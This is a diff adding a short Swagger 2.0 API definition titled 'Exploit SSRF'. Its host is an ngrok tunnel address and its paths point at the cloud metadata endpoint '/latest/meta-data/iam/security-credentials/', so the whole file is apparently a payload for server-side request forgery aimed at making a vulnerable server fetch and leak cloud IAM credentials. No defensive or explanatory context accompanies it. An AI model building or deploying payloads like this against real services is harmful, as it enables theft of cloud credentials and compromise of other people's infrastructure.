@@ -1,0 +1,21 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Exploit SSRF",
+    "version": "1.0"
+  },
+  "host": "https://a570-2404-c0-9820-00-290-f15b.ngrok-free.app",
+  "basePath": "/latest/meta-data/",
+  "paths": {
+    "/iam/security-credentials/": {
+      "get": {
+        "summary": "SSRF Trigger",
+        "responses": {
+          "200": {
+            "description": "SSRF response"
+          }
+        }
+      }
+    }
+  }
+}
